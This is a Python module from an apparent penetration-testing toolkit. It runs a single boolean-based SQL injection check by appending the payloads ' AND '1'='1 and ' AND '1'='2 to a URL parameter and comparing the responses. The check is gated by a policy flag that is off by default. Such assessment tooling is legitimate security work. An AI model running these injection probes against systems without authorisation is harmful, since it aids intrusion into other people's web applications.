"""
Optional single-shot SQLi boolean canary (prove v2).

Only runs when policy.allow_sqli_boolean is true.
Sends two GETs that differ by a classic true/false boolean suffix and compares
response length / status — no time-based, no UNION dump, no sqlmap.
"""

from __future__ import annotations

import hashlib
import re
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from prove.http_util import http_get


def validate(item: dict[str, Any], policy: dict[str, Any]) -> dict[str, Any]:
    if not policy.get("allow_sqli_boolean"):
        return {
            "status": "skipped",
            "evidence": (
                "sqli_boolean disabled (default). "
                "Enable only under RoE: set allow_sqli_boolean=true in exploit_policy.json."
            ),
            "impact_note": "",
            "meta": {"enabled": False},
        }

    asset = (item.get("asset") or "") + " " + (item.get("evidence") or "")
    url = _extract_url(asset)
    if not url or "?" not in url:
        return {
            "status": "needs_manual",
            "evidence": "No parameterized http(s) URL for boolean canary.",
            "impact_note": "",
        }

    true_url = _append_to_first_param(url, "' AND '1'='1")
    false_url = _append_to_first_param(url, "' AND '1'='2")
    timeout = float(policy.get("request_timeout_sec") or 15)
    ua = str(policy.get("user_agent") or "reconkit-prove/2.2.0")

    r_base = http_get(url, timeout=timeout, user_agent=ua)
    r_true = http_get(true_url, timeout=timeout, user_agent=ua)
    r_false = http_get(false_url, timeout=timeout, user_agent=ua)

    if (r_true.get("error") and r_true.get("status") is None) or (
        r_false.get("error") and r_false.get("status") is None
    ):
        return {
            "status": "error",
            "evidence": f"request failed true={r_true.get('error')} false={r_false.get('error')}",
            "impact_note": "",
        }

    bt, bf = r_true.get("body") or "", r_false.get("body") or ""
    lt, lf = len(bt), len(bf)
    st, sf = r_true.get("status"), r_false.get("status")
    ht = hashlib.sha1(bt.encode("utf-8", errors="replace")).hexdigest()[:12]
    hf = hashlib.sha1(bf.encode("utf-8", errors="replace")).hexdigest()[:12]
    len_diff = abs(lt - lf)
    status_diff = st != sf
    hash_diff = ht != hf

    # Heuristic: true vs false differ, and true is not identical to the untouched baseline
    bhash = hashlib.sha1((r_base.get("body") or "").encode("utf-8", errors="replace")).hexdigest()[:12]
    interesting = (len_diff >= 20 or status_diff) and hash_diff and ht != bhash

    evidence = (
        f"boolean canary (single pair only)\n"
        f"true_url={true_url}\nfalse_url={false_url}\n"
        f"true:  status={st} len={lt} hash={ht}\n"
        f"false: status={sf} len={lf} hash={hf}\n"
        f"len_diff={len_diff} status_diff={status_diff}"
    )

    if interesting:
        return {
            "status": "confirmed",
            "evidence": evidence,
            "impact_note": (
                "True/false responses differ — possible SQLi. "
                "Manual confirmation only; toolkit will not dump data."
            ),
            "meta": {
                "len_true": lt,
                "len_false": lf,
                "status_true": st,
                "status_false": sf,
            },
        }

    return {
        "status": "not_exploitable",
        "evidence": evidence + "\nNo significant true/false divergence.",
        "impact_note": "",
        "meta": {"len_true": lt, "len_false": lf},
    }


def _append_to_first_param(url: str, suffix: str) -> str:
    try:
        parts = urlparse(url)
        q = list(parse_qsl(parts.query, keep_blank_values=True))
        if not q:
            q = [("id", "1" + suffix)]
        else:
            k, v = q[0]
            q[0] = (k, (v or "") + suffix)
        return urlunparse(
            (parts.scheme, parts.netloc, parts.path, parts.params, urlencode(q), parts.fragment)
        )
    except Exception:
        return url


def _extract_url(text: str) -> str | None:
    m = re.search(r"https?://[^\s\"'<>]+", text or "")
    if not m:
        return None
    url = m.group(0).rstrip(").,;]")
    try:
        p = urlparse(url)
        if p.scheme in ("http", "https") and p.netloc:
            return url
    except Exception:
        return None
    return None
